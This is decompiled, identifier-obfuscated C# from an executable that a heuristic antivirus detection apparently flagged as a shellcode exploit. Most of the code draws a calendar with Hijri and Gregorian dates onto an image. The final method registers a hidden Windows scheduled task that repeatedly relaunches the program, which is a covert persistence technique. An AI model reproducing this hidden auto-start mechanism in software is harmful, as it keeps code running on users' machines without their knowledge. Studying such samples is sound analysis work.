// Decompiled with JetBrains decompiler
// Type: 069511259246.Core.644492104953
// Assembly: 069511259246, Version=1.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 6D0FD131-484D-4146-B8A3-FCA5C0E4E111
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-e7ff83830fd4bf4e75004c85a34aa787b5c6b7dedba3c5ff9843edd5e688f2d5.exe

using \u003069511259246.Core;
using \u003069511259246.Models;
using \u003069511259246.Utils;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Text;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace \u003069511259246.Core
{
  public class \u003644492104953 : IDisposable
  {
    private const int \u003277467500201 = 130;
    private const int \u003917794232548 = 15;
    private const string \u003623200775866 = "31";
    private const int \u003507276637837 = 70;
    private const int \u003117853684563 = 20;
    private readonly int \u003792933221404;
    private readonly Graphics \u003999737865977;
    private readonly Image \u003798596055946;
    private readonly int \u003058560798385;
    private readonly int \u003331961362972;
    private Color \u003755833383727;
    private bool \u003199926306236;
    private Color \u003037922895831;
    private Color \u003289685597156;
    private int \u003579541971491;
    private int \u003070836308968;
    private int \u003830846335670;
    private IList<Point> \u003710827070715;
    private int \u003340725916753;
    internal static readonly long \u003944900252555;

    public string \u003559818053170 { set; get; }

    public int \u003244637697136 { set; get; }

    public string \u003901145765562 { set; get; }

    public int \u003963607666152 { set; get; }

    public string \u003323966153610 { set; get; }

    public IList<\u003756220430457> \u003042498357403 { set; get; }

    public int \u003509718242244 { set; get; }

    public bool \u003928798058525 { set; get; }

    public Color \u003193231451252 { set; get; }

    public bool \u003760566901270 { set; get; }

    public void \u003540665600849()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    public Image \u003009310724737()
    {
      this.\u003132426987655();
      this.\u003054735863809();
      this.\u003135892228516();
      this.\u003710827070715 = (IList<Point>) this.\u003149766711906();
      this.\u003907963280275();
      this.\u003256910873717();
      this.\u003830004871005();
      return this.\u003798596055946;
    }

    protected virtual void Dispose(bool disposeManagedResources)
    {
      if (this.\u003199926306236 || !disposeManagedResources)
        return;
      this.\u003999737865977?.Dispose();
      this.\u003199926306236 = true;
    }

    private List<Point> \u003149766711906()
    {
      List<Point> pointList = new List<Point>();
      for (int index1 = 0; index1 < 7; ++index1)
      {
        for (int index2 = 0; index2 < 7; ++index2)
        {
          Point point = new Point(this.\u003579541971491 + index2 * this.\u003830846335670, this.\u003340725916753 + index1 * this.\u003070836308968);
          pointList.Add(point);
        }
      }
      return pointList;
    }

    private void \u003256910873717()
    {
      List<\u003756220430457> objList = new List<\u003756220430457>();
      int num1 = \u003212923899420.\u003727629749349(this.\u003331961362972, this.\u003058560798385);
      int num2 = this.\u003058560798385 <= 6 ? 31 : 30;
      if (this.\u003058560798385 - 1 == 11)
        num2 = \u003477943149944.\u003978986971746(this.\u003331961362972) ? 30 : 29;
      int num3 = 1;
      int num4 = num1 + 1;
      foreach (Point point in this.\u003710827070715.Skip<Point>(7).Take<Point>(7 - num1).Reverse<Point>().ToList<Point>())
      {
        this.\u003686096952877(num3, num4, point, (IList<\u003756220430457>) objList);
        ++num4;
        ++num3;
      }
      List<Point> list = this.\u003710827070715.Skip<Point>(14).ToList<Point>();
      int count = 0;
      Point point1 = new Point(this.\u003579541971491, this.\u003340725916753 + 7 * this.\u003070836308968);
      while (num3 <= num2)
      {
        IEnumerable<Point> points = list.Skip<Point>(count).Take<Point>(7).Reverse<Point>();
        int num5 = 1;
        foreach (Point point2 in points)
        {
          this.\u003686096952877(num3, num5, point2, (IList<\u003756220430457>) objList);
          ++num5;
          ++num3;
          if (num3 > num2)
          {
            point1 = point2;
            break;
          }
        }
        count += 7;
      }
      this.\u003700517727980((IList<\u003756220430457>) objList, point1);
    }

    private void \u003686096952877(
      int _param1,
      int _param2,
      Point _param3,
      IList<\u003756220430457> _param4)
    {
      Color? nullable = _param1 == this.\u003792933221404 ? new Color?(this.\u003193231451252) : new Color?();
      \u003756220430457 obj = this.\u003551969313701(_param1);
      if (obj != null)
      {
        if (_param1 != this.\u003792933221404)
          nullable = new Color?(this.\u003289685597156);
        if (this.\u003928798058525 || _param1 >= this.\u003792933221404)
        {
          obj.\u003742912296434 = this.\u003792933221404 == _param1;
          _param4.Add(obj);
        }
      }
      if (_param2 == 7 && _param1 != this.\u003792933221404)
        nullable = new Color?(this.\u003289685597156);
      string str = _param1.ToString((IFormatProvider) CultureInfo.InvariantCulture).\u003918885898616();
      this.\u003561862175427(_param3, str, this.\u003830846335670, this.\u003244637697136, nullable);
    }

    private void \u003907963280275()
    {
      for (int index = 6; index >= 0; --index)
      {
        string str = \u003249291484438.\u003543114186882[6 - index];
        this.\u003561862175427(this.\u003710827070715[index], str, this.\u003830846335670, this.\u003244637697136, \u003980932115747: true);
      }
    }

    private IEnumerable<\u003066386111273> \u003826653903074()
    {
      CultureInfo provider = new CultureInfo("ar-SA")
      {
        DateTimeFormat = {
          Calendar = (Calendar) new HijriCalendar()
        }
      };
      DateTime now = DateTime.Now;
      \u003066386111273[] objArray = new \u003066386111273[3];
      \u003066386111273 obj1 = new \u003066386111273();
      ((\u003463114320220) obj1).set_Day(this.\u003792933221404.ToString());
      obj1.\u003623265136547 = \u003912642783969.\u003674957319898[this.\u003058560798385 - 1] + " " + this.\u003331961362972.ToString((IFormatProvider) CultureInfo.InvariantCulture).\u003918885898616();
      objArray[0] = obj1;
      \u003066386111273 obj2 = new \u003066386111273();
      ((\u003463114320220) obj2).set_Day(string.Format("{0}", (object) int.Parse(now.ToString("dd", (IFormatProvider) provider))));
      obj2.\u003623265136547 = now.ToString("MMMM yyyy", (IFormatProvider) provider) ?? "";
      objArray[1] = obj2;
      \u003066386111273 obj3 = new \u003066386111273();
      ((\u003463114320220) obj3).set_Day(now.Day.ToString());
      obj3.\u003623265136547 = now.ToString("yyyy, MMMM", (IFormatProvider) CultureInfo.InvariantCulture) ?? "";
      objArray[2] = obj3;
      return (IEnumerable<\u003066386111273>) objArray;
    }

    private string \u003676205765426() => Path.Combine(\u003792907266257.\u003135826589093(), "fonts", this.\u003559818053170);

    private \u003756220430457 \u003551969313701(int _param1)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u003644492104953.\u003496033394235 obj = (\u003644492104953.\u003496033394235) new \u003644492104953.\u003669522343547();
      // ISSUE: reference to a compiler-generated field
      ((\u003644492104953.\u003669522343547) obj).\u003329938937258 = this;
      // ISSUE: reference to a compiler-generated field
      obj.\u003326939907780 = _param1;
      // ISSUE: reference to a compiler-generated method
      return this.\u003042498357403.FirstOrDefault<\u003756220430457>(new Func<\u003756220430457, bool>(obj.\u003421349400321));
    }

    private SizeF \u003219686014023(int _param1_1)
    {
      List<SizeF> source = new List<SizeF>();
      foreach (string str in \u003249291484438.\u003543114186882)
        source.Add(this.\u003731280083901(str, this.\u003244637697136));
      source.Add(this.\u003731280083901("31", this.\u003244637697136));
      float num = source.Select<SizeF, float>((Func<SizeF, float>) (_param1_2 => _param1_2.Height)).Max();
      return new SizeF(source.Select<SizeF, float>((Func<SizeF, float>) (_param1_3 => _param1_3.Width)).Max() + (float) _param1_1, num + (float) _param1_1);
    }

    private SizeF \u003731280083901(string _param1, int _param2)
    {
      string str = this.\u003676205765426();
      return \u003583008800535.\u003071084192113(_param1, _param2, FontStyle.Regular, str);
    }

    private void \u003830004871005()
    {
      if (!this.\u003760566901270)
        return;
      using (Font font = new Font(this.\u003901145765562, (float) this.\u003963607666152, FontStyle.Regular, GraphicsUnit.Pixel))
      {
        SizeF sizeF = \u003583008800535.\u003202444960121(this.\u003323966153610, font);
        this.\u003561862175427(new Point((int) ((double) this.\u003798596055946.Width - (246.0 + (double) sizeF.Width + 5.0)), this.\u003798596055946.Height - 120), this.\u003323966153610, (int) sizeF.Width + 20, this.\u003963607666152, \u003136548533417: false, \u003036308779933: font);
      }
    }

    private void \u003135892228516()
    {
      int num1 = this.\u003070836308968 + 20;
      int num2 = this.\u003830846335670;
      int num3 = this.\u003830846335670 * 6;
      int num4 = 0;
      foreach (\u003066386111273 obj in this.\u003826653903074())
      {
        Point point = new Point(this.\u003798596055946.Width - (70 + num2), num1 + num4 * this.\u003070836308968);
        this.\u003561862175427(point, obj.\u003142890186299, num2, this.\u003509718242244, new Color?(this.\u003037922895831));
        point = new Point(this.\u003798596055946.Width - (70 + num3 + num2), num1 + num4 * this.\u003070836308968);
        this.\u003561862175427(point, obj.\u003623265136547, num3, this.\u003509718242244, new Color?(this.\u003037922895831));
        ++num4;
      }
      this.\u003340725916753 = 4 * this.\u003070836308968 + 20;
    }

    private void \u003700517727980(IList<\u003756220430457> _param1, Point _param2)
    {
      int num = 2;
      float width1 = this.\u003731280083901("31", this.\u003509718242244).Width;
      foreach (\u003756220430457 obj in (IEnumerable<\u003756220430457>) _param1)
      {
        float width2 = this.\u003731280083901(obj.\u003446485846600, this.\u003509718242244).Width;
        Point point = new Point((int) ((double) this.\u003798596055946.Width - (70.0 + (double) width1 + 5.0)), _param2.Y + num * this.\u003070836308968);
        this.\u003561862175427(point, obj.\u003730288498158.ToString(), (int) width1 + 5, this.\u003509718242244, new Color?(obj.\u003742912296434 ? this.\u003193231451252 : this.\u003289685597156));
        point = new Point((int) ((double) this.\u003798596055946.Width - (70.0 + (double) width2 + (double) width1 + 10.0)), _param2.Y + num * this.\u003070836308968);
        this.\u003561862175427(point, obj.\u003446485846600, (int) width2 + 5, this.\u003509718242244, new Color?(obj.\u003742912296434 ? this.\u003193231451252 : this.\u003289685597156));
        ++num;
      }
    }

    private void \u003561862175427(
      Point _param1,
      string _param2,
      int _param3,
      int _param4,
      Color? _param5 = null,
      bool _param6 = true,
      bool _param7 = false,
      Font _param8 = null)
    {
      int x = _param1.X;
      int y = _param1.Y;
      double num = _param8 == null ? (double) this.\u003731280083901(_param2, _param4).Height : (double) \u003583008800535.\u003202444960121(_param2, _param8).Height;
      int height = (int) num + 15;
      if (num > (double) this.\u003070836308968)
        y -= height - this.\u003070836308968;
      Color color1 = !_param5.HasValue ? this.\u003755833383727 : Color.FromArgb(110, _param5.Value);
      if (_param7)
        color1 = color1.\u003555548105230(-0.12f);
      Rectangle layoutRectangle = new Rectangle(x, y, _param3, height);
      Graphics graphics = this.\u003999737865977;
      Rectangle rectangle = layoutRectangle;
      Pen pen = new Pen(color1);
      pen.Width = 1.1f;
      Color color2 = color1;
      \u003583008800535.\u003647610024405(graphics, rectangle, 15, pen, color2);
      StringFormat format = new StringFormat()
      {
        LineAlignment = StringAlignment.Center,
        Alignment = StringAlignment.Center,
        FormatFlags = _param6 ? StringFormatFlags.DirectionRightToLeft : StringFormatFlags.NoClip
      };
      this.\u003999737865977.TextRenderingHint = TextRenderingHint.AntiAlias;
      Color color3 = color1.\u003986741709198() < 130 ? Color.White : Color.Black;
      if (_param8 != null)
      {
        this.\u003999737865977.DrawString(_param2, _param8, (Brush) new SolidBrush(color3), (RectangleF) layoutRectangle, format);
      }
      else
      {
        using (PrivateFontCollection privateFontCollection = new PrivateFontCollection())
        {
          privateFontCollection.AddFontFile(this.\u003676205765426());
          using (FontFamily family = privateFontCollection.Families[0])
          {
            using (Font font = new Font(family, (float) _param4, FontStyle.Regular, GraphicsUnit.Pixel))
              this.\u003999737865977.DrawString(_param2, font, (Brush) new SolidBrush(color3), (RectangleF) layoutRectangle, format);
          }
        }
      }
    }

    private void \u003273088994833()
    {
      this.\u003755833383727 = this.\u003798596055946.\u003862817445945(new Rectangle(this.\u003579541971491 - 70, 0, this.\u003798596055946.Width, this.\u003798596055946.Height / 2)).\u003256289464636();
      this.\u003755833383727 = Color.FromArgb(190, this.\u003755833383727);
      while (this.\u003755833383727.\u003986741709198() >= 130)
        this.\u003755833383727 = this.\u003755833383727.\u003555548105230(-0.01f);
    }

    private void \u003054735863809()
    {
      this.\u003273088994833();
      this.\u003289685597156 = this.\u003755833383727.\u003555548105230(-0.7f);
      this.\u003037922895831 = this.\u003755833383727.\u003555548105230(-0.4f);
    }

    private void \u003132426987655()
    {
      SizeF sizeF = this.\u003219686014023(15);
      this.\u003070836308968 = (int) sizeF.Height;
      this.\u003830846335670 = (int) sizeF.Width;
      this.\u003579541971491 = this.\u003798596055946.Width - (70 + 7 * this.\u003830846335670);
    }

    public static void \u003770608220336()
    {
      try
      {
        ExecAction execAction = new ExecAction(Application.ExecutablePath, (string) null, Application.StartupPath);
        using (TaskDefinition taskDefinition = TaskService.Instance.NewTask())
        {
          int num = TaskService.Instance.HighestSupportedVersion >= new Version(1, 2) ? 1 : 0;
          taskDefinition.RegistrationInfo.Description = "069511259246 Runner";
          taskDefinition.RegistrationInfo.Author = "DNT";
          taskDefinition.Settings.Hidden = true;
          taskDefinition.Settings.Enabled = true;
          taskDefinition.Settings.DisallowStartIfOnBatteries = false;
          taskDefinition.Settings.StopIfGoingOnBatteries = false;
          if (num != 0)
          {
            taskDefinition.Settings.StartWhenAvailable = true;
            taskDefinition.Settings.MultipleInstances = (TaskInstancesPolicy) 2;
          }
          TimeTrigger timeTrigger1 = \u003644230754300.\u003805090547117();
          if (num == 0)
            ((Trigger) timeTrigger1).Repetition.Duration = TimeSpan.FromHours(1.1);
          taskDefinition.Triggers.Add((Trigger) timeTrigger1);
          TimeTrigger timeTrigger2 = \u003644230754300.\u003466978187378();
          if (num == 0)
            ((Trigger) timeTrigger2).Repetition.Duration = TimeSpan.FromHours(1.1);
          taskDefinition.Triggers.Add((Trigger) timeTrigger2);
          taskDefinition.Actions.Add((Action) execAction);
          TaskService.Instance.RootFolder.RegisterTaskDefinition("069511259246 Runner", taskDefinition, (TaskCreation) 6, (string) null, (string) null, (TaskLogonType) 3, (string) null);
        }
        Console.WriteLine("`069511259246 Runner` task has been added.");
      }
      catch (Exception ex)
      {
        ex.\u003814742381867();
      }
    }
  }
}
